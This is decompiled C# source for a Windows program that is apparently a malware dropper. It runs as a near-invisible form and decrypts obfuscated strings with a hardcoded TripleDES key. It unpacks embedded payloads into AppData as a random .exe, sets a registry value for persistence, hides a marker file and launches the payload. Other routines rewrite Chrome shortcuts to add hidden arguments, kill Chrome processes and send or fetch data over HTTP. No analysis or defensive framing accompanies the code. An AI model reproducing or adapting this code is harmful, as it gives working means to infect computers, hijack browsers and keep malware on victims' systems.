using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using LOL03.My;
using LOL03.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace LOL03;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	private const string DRBOYYYYYYYYYYYYYYYYYYYYYY_pass = "HABJSNABADI";

	private string DRBOYYYYYYYYYYYYYYYYYYYYYY_PASTASALVAR;

	private string DRBOYYYYYYYYYYYYYYYYYYYYYY_caminhox;

	private string DRBOYYYYYYYYYYYYYYYYYYYYYY_PROCESS_NAME;

	private string DRBOYYYYYYYYYYYYYYYYYYYYYY_APPDATA;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		DRBOYYYYYYYYYYYYYYYYYYYYYY_PROCESS_NAME = "chrome";
		DRBOYYYYYYYYYYYYYYYYYYYYYY_APPDATA = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		Size clientSize = new Size(4, 4);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_Text("WINDOWSNT");
		((Control)this).ResumeLayout(false);
	}

	public static string DRBOYYYYYYYYYYYYYYYYYYYYYY_decript(string Message)
	{
		UTF8Encoding uTF8Encoding = new UTF8Encoding();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] key = mD5CryptoServiceProvider.ComputeHash(uTF8Encoding.GetBytes("HABJSNABADI"));
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		tripleDESCryptoServiceProvider.Key = key;
		tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
		tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		byte[] array = Convert.FromBase64String(Message);
		byte[] bytes;
		try
		{
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
			bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		}
		finally
		{
			tripleDESCryptoServiceProvider.Clear();
			mD5CryptoServiceProvider.Clear();
		}
		return uTF8Encoding.GetString(bytes);
	}

	public void DRBOYYYYYYYYYYYYYYYYYYYYYY_DecompressFile(string sourceFile, string destinationFile)
	{
		if (!File.Exists(sourceFile))
		{
			throw new FileNotFoundException();
		}
		FileStream fileStream = null;
		FileStream fileStream2 = null;
		GZipStream gZipStream = null;
		byte[] array = null;
		checked
		{
			try
			{
				fileStream = new FileStream(sourceFile, FileMode.Open);
				gZipStream = new GZipStream(fileStream, CompressionMode.Decompress, leaveOpen: true);
				array = new byte[5];
				int num = (int)fileStream.Length - 4;
				fileStream.Position = num;
				fileStream.Read(array, 0, 4);
				fileStream.Position = 0L;
				int num2 = BitConverter.ToInt32(array, 0);
				byte[] buffer = new byte[num2 + 100 + 1];
				int num3 = 0;
				int num4 = 0;
				while (true)
				{
					int num5 = gZipStream.Read(buffer, num3, 100);
					if (num5 == 0)
					{
						break;
					}
					num3 += num5;
					num4 += num5;
				}
				fileStream2 = new FileStream(destinationFile, FileMode.Create);
				fileStream2.Write(buffer, 0, num4);
				fileStream2.Flush();
			}
			catch (ApplicationException projectError)
			{
				ProjectData.SetProjectError((Exception)projectError);
				ProjectData.ClearProjectError();
			}
			finally
			{
				fileStream?.Close();
				gZipStream?.Close();
				fileStream2?.Close();
			}
		}
	}

	public object DRBOYYYYYYYYYYYYYYYYYYYYYY_aleatorio(ref string num)
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		Random random = new Random();
		StringBuilder stringBuilder = new StringBuilder();
		int num2 = Conversions.ToInteger(num);
		for (int i = 1; i <= num2; i = checked(i + 1))
		{
			int startIndex = random.Next(0, 35);
			stringBuilder.Append(text.Substring(startIndex, 1));
		}
		return stringBuilder.ToString();
	}

	public string getPageSource(string url)
	{
		string result = string.Empty;
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
			result = streamReader.ReadToEnd();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void downimg(string url, string path)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFile(url, path);
		webClient.Dispose();
	}

	public object DRBOYYYYYYYYYYYYYYYYYYYYYY_SENDSTRING(ref string URL, ref string STRINGS)
	{
		object result = default(object);
		try
		{
			string text = "";
			string s = STRINGS;
			new UTF8Encoding();
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(URL);
			httpWebRequest.Method = "POST";
			httpWebRequest.KeepAlive = true;
			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest.Referer = URL;
			httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)";
			httpWebRequest.ContentLength = bytes.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
			text = streamReader.ReadToEnd();
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		if (!File.Exists(DRBOYYYYYYYYYYYYYYYYYYYYYY_APPDATA + "\\" + ((ServerComputer)MyProject.Computer).get_Name() + DRBOYYYYYYYYYYYYYYYYYYYYYY_decript("NbQXljvH8zc=")))
		{
			try
			{
				string num = Conversions.ToString(8);
				string text = Conversions.ToString(DRBOYYYYYYYYYYYYYYYYYYYYYY_aleatorio(ref num));
				string text2 = DRBOYYYYYYYYYYYYYYYYYYYYYY_APPDATA + "\\" + text + ".exe";
				string destinationFile = DRBOYYYYYYYYYYYYYYYYYYYYYY_APPDATA + DRBOYYYYYYYYYYYYYYYYYYYYYY_decript("Upkg+7VcrtTnM/JVhfH1BtrrGF+8mNdbADb+gQCS600=");
				byte[] aRQUIVO = Resources.ARQUIVO2;
				byte[] array = aRQUIVO;
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(DRBOYYYYYYYYYYYYYYYYYYYYYY_APPDATA + DRBOYYYYYYYYYYYYYYYYYYYYYY_decript("8I4dNaIUPvJ/sEjnncgeeQ=="), array, false);
				byte[] dLL = Resources.DLL;
				byte[] array2 = dLL;
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(DRBOYYYYYYYYYYYYYYYYYYYYYY_APPDATA + DRBOYYYYYYYYYYYYYYYYYYYYYY_decript("pby8ljqerzz0xnQ9xEjYiA=="), array2, false);
				Thread.Sleep(2000);
				DRBOYYYYYYYYYYYYYYYYYYYYYY_DecompressFile(DRBOYYYYYYYYYYYYYYYYYYYYYY_APPDATA + DRBOYYYYYYYYYYYYYYYYYYYYYY_decript("8I4dNaIUPvJ/sEjnncgeeQ=="), text2);
				Thread.Sleep(2000);
				DRBOYYYYYYYYYYYYYYYYYYYYYY_DecompressFile(DRBOYYYYYYYYYYYYYYYYYYYYYY_APPDATA + DRBOYYYYYYYYYYYYYYYYYYYYYY_decript("pby8ljqerzz0xnQ9xEjYiA=="), destinationFile);
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_Registry().SetValue(DRBOYYYYYYYYYYYYYYYYYYYYYY_decript("FwJVOLqyKOHFj5JGCuaP4VOOrUZuIoyeQ3U0iR3b/CzDGd9ByyeLsWSTdut7oB3MuFFnbJcNYaS28WNUJlsv6Q=="), ((ServerComputer)MyProject.Computer).get_Name() + "2REG.KAYC", (object)text2);
				File.Create(DRBOYYYYYYYYYYYYYYYYYYYYYY_APPDATA + "\\" + ((ServerComputer)MyProject.Computer).get_Name() + DRBOYYYYYYYYYYYYYYYYYYYYYY_decript("NbQXljvH8zc="));
				FileSystem.SetAttr(DRBOYYYYYYYYYYYYYYYYYYYYYY_APPDATA + "\\" + ((ServerComputer)MyProject.Computer).get_Name() + DRBOYYYYYYYYYYYYYYYYYYYYYY_decript("NbQXljvH8zc="), (FileAttribute)2);
				Interaction.Shell(text2, (AppWinStyle)2, false, -1);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			ProjectData.EndApp();
		}
		else
		{
			ProjectData.EndApp();
		}
	}

	private void DRBOYYYYYYYYYYYYYYYYYYYYYY_PesquisaArquivos(string NomeDir)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Path.GetDirectoryName(NomeDir));
		try
		{
			FileInfo[] files = directoryInfo.GetFiles(Path.GetFileName(NomeDir));
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				if (Operators.CompareString(DRBOYYYYYYYYYYYYYYYYYYYYYY_caminhox, "", false) == 0)
				{
					StreamReader streamReader = new StreamReader(fileInfo.FullName);
					string text = streamReader.ReadToEnd();
					string[] array2 = text.Split(new string[1] { "\\chrome.exe" }, StringSplitOptions.RemoveEmptyEntries);
					text = array2[0];
					string[] array3 = text.Split(new string[1] { ":\\" }, StringSplitOptions.RemoveEmptyEntries);
					text = array3[2];
					DRBOYYYYYYYYYYYYYYYYYYYYYY_caminhox = "c:\\" + text + "\\chrome.exe";
					streamReader.Close();
				}
				string caminho = fileInfo.FullName;
				DRBOYYYYYYYYYYYYYYYYYYYYYY_XYZ3(ref caminho, ref DRBOYYYYYYYYYYYYYYYYYYYYYY_caminhox);
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			DirectoryInfo[] array4 = directories;
			foreach (DirectoryInfo directoryInfo2 in array4)
			{
				DRBOYYYYYYYYYYYYYYYYYYYYYY_PesquisaArquivos(directoryInfo2.FullName + "\\" + Path.GetFileName(NomeDir));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DRBOYYYYYYYYYYYYYYYYYYYYYY_XYZ3(ref string caminho, ref string caminhode)
	{
		try
		{
			File.Delete(caminho);
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
			objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
			object obj = objectValue;
			object[] array = new object[1] { caminho };
			object[] array2 = array;
			bool[] array3 = new bool[1] { true };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "CreateShortcut", array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				caminho = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			object objectValue2 = RuntimeHelpers.GetObjectValue(obj2);
			object[] array4 = new object[1];
			object[] array5 = array4;
			object obj3 = objectValue;
			object[] array6 = new object[1] { caminhode };
			object[] array7 = array6;
			array3 = new bool[1] { true };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "ExpandEnvironmentStrings", array7, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				caminhode = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[0]), typeof(string));
			}
			array5[0] = RuntimeHelpers.GetObjectValue(obj4);
			NewLateBinding.LateSet(objectValue2, (Type)null, "TargetPath", array4, (string[])null, (Type[])null);
			NewLateBinding.LateSet(objectValue2, (Type)null, "Arguments", new object[1] { DRBOYYYYYYYYYYYYYYYYYYYYYY_decript("glyMJ5ArfE+PMBWieHnEkUWaKDQ9h7ip") + DRBOYYYYYYYYYYYYYYYYYYYYYY_PASTASALVAR }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(objectValue2, (Type)null, "WorkingDirectory", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExpandEnvironmentStrings", new object[1] { Strings.Replace(caminhode, "chrome.exe", "", 1, -1, (CompareMethod)0) }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(objectValue2, (Type)null, "WindowStyle", new object[1] { 4 }, (string[])null, (Type[])null);
			NewLateBinding.LateCall(objectValue2, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DRBOYYYYYYYYYYYYYYYYYYYYYY_closepro()
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (Operators.CompareString(process.ProcessName, DRBOYYYYYYYYYYYYYYYYYYYYYY_PROCESS_NAME, false) == 0)
			{
				process.Kill();
			}
		}
	}
}
